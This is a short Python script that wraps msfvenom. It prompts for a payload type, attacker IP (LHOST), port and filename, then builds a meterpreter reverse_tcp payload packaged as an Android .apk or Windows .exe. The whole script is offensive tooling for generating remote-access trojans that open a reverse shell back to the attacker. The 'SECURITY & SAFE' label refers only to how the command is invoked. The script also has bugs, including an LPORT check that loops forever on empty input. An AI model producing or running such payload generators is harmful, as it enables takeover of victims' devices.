import subprocess as sub


payload = input("Enter The Type of Payload : ")
Payload = payload.lower()
while Payload=="":
  print("-.-.-.-Error Please Enter The Payload-.-.-.-")
  Payload =input("Enter The Type of Payload : ")

LHOST = input("Enter The IP Address LHOST : ")
while LHOST=="":
  print("-.-.-.-Error Please Enter The LHOST-.-.-.-")
  LHOST=input("Enter The IP Address LHSOT : ")

LPORT = input("Enter The Set Received Code LPORT : ")
while LPORT=="":
  print("-.-.-.-Error Please Enter The LPORT-.-.-.-")

filename = input("Enter The File Name Save : ")
Filename=filename.lower()
while Filename=="":
  print("-.-.-.-Error Please Enter The File Name-.-.-.-")
  Filename=input("Enter The File Name Save ")

print("__________________________________________________________")

print("\t\t\tPlease Wait.... \n Your Payload Generating " + Payload + " With Your IP Address LHOST " + LHOST + " With Received Code is " + LPORT + " And Saved File Name is " + Filename )

print("\n................This Will Not Take Long Time..............")


#SECURITY & SAFE

if Payload=="android":
  sub.call(["msfvenom" , "-p" , Payload+"/meterpreter/reverse_tcp" , "LHOST="+LHOST , "LPORT="+LPORT,"-o", Filename+".apk"])
else:
  sub.call(["msfvenom" , "-p" , Payload+"/meterpreter/reverse_tcp" , "LHOST="+LHOST , "LPORT="+LPORT,"-f" , "exe" , "-o" , Filename+".exe"])


#NON SECURITY & NO SAFE

#if Payload=="android":
#  subprocess.call("msfvenom -p " + Payload+"meterpreter/reverse_tcp" + " LHOST=" + LHOST + " LPORT=" + LPORT +" -o " + Filename )
#else:
#  subprocess.call("msfvenom -p " + Payload+"meterpreter/reverse_tcp" + " LHOST=" + LHOST + " LPORT=" + LPORT +" -o " + Filename )

    
